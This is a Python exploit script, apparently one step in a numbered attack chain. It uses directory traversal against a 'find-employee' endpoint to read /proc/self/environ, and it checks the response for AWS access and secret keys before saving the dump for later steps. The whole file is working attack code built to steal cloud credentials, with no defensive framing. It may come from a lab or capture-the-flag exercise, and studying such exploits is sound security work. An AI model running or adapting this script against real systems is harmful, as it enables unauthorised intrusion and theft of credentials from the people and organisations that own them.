# file: 02_dump_environ.py
import requests
from shared.helpers import State

# try multiple depths to be robust
DEPTHS = list(range(6, 14))  # 6..13
TARGET = "/proc/self/environ"

def attempt(base, depth):
    traversal = "../" * depth
    url = f"{base}/find-employee?employee_code={traversal}{TARGET}"
    r = requests.get(url, timeout=20)
    body = r.text
    hit = (r.status_code == 200) and ("AWS_ACCESS_KEY_ID" in body or "LAMBDA_TASK_ROOT" in body or "AWS_SECRET_ACCESS_KEY" in body or "\x00" in body)
    return hit, r.status_code, url, body

def main():
    cfg = State.load_cfg()
    mem = State.load_mem()

    if not mem.get('lfi_confirmed'):
        print("[!] LFI not confirmed yet. Run 01_lfi_check.py first.")
        # continue anyway, in case user wants to try

    base = cfg['base_url'].rstrip('/')
    for d in DEPTHS:
        hit, code, url, body = attempt(base, d)
        print(f"[*] depth={d} status={code} url={url}")
        if hit:
            print("[+] environ dumped!")
            mem.update({'environ_url': url, 'environ_status_code': code, 'environ_raw': body[:200000]})
            State.save_mem(mem)
            return

    print("[!] Could not dump /proc/self/environ. Try adjusting depths or confirm endpoint path.")

if __name__ == '__main__':
    main()